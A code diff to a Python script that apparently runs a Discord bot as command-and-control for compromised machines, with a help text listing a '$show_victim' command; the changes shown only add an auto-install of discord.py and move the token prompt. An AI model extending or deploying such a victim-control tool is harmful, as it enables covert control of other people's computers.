@@ -1,8 +1,12 @@
+# -*- coding: utf-8 -*-
 import os
 from pathlib import Path
 import itertools
-import discord
-from discord.ext import commands
+try:    
+    import discord
+    from discord.ext import commands
+except:
+    os.system("pip install discord.py")
 from os import walk
 
 banner = """
@@ -13,7 +17,7 @@ banner = """
                           coded by script1337
 
 """
-token = input("Enter your bot token# ")
+
 help = """
 command:
        1.$show_victim (Get list of  all victims)
@@ -116,5 +120,5 @@ async def shutdown(ctx):
     await ctx.send('```server going down...```')
     exit(0)
 
-
+token = input("Enter your bot token# ")
 client.run(str(token))
